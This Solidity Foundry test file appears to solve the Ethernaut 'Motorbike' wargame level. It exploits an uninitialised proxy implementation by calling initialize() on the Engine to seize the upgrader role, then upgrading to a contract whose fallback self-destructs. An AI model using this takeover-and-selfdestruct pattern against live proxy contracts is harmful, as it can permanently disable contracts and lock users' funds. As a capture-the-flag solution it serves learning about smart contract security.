pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../Motorbike/Motorbike.sol";
import "./utils/vm.sol";

import {console} from "forge-std/Console.sol";

contract MotorbikeTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    address eoaAddress = address(100);

    event IsTrue(bool answer);

    function setUp() public {
        // Deal EOA address some ether
        vm.deal(eoaAddress, 5 ether);
    }

    function testMotorbikeHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        Engine engine = new Engine();
        Motorbike motorbike = new Motorbike(address(engine));
        Engine ethernautEngine = Engine(payable(address(motorbike)));


        bytes32 engineAddress = vm.load(address(motorbike),bytes32(uint256(0)));
        bytes32  slot1 = vm.load(address(motorbike),bytes32(uint256(1)));
        console.log("Slots in motorbike contract");
        console.logBytes32(engineAddress);
        console.logBytes32(slot1);

        bytes32 upgrader = vm.load(address(engine),bytes32(uint256(0)));
        bytes32 horsePower = vm.load(address(engine),bytes32(uint256(1)));
        console.log("Slots in engine contract");
        console.logBytes32(upgrader);
        console.logBytes32(horsePower);
        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // initialise the engine
        engine.initialize();

        Destroyable destroyable = new Destroyable();

        engine.upgradeToAndCall(address(destroyable), "");
  
        

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        // Because of the way foundry test work it is very hard to verify this test was successful
        // Selfdestruct is a substate (see pg 8 https://ethereum.github.io/yellowpaper/paper.pdf)
        // This means it gets executed at the end of a transaction, a single test is a single transaction
        // This means we can call selfdestruct on the engine contract at the start of the test but we will
        // continue to be allowed to call all other contract function for the duration of that transaction (test)
        // since the selfdestruct execution only happy at the end 
    }
}

contract Destroyable {
    fallback() external {
        selfdestruct(payable(msg.sender));
    }
}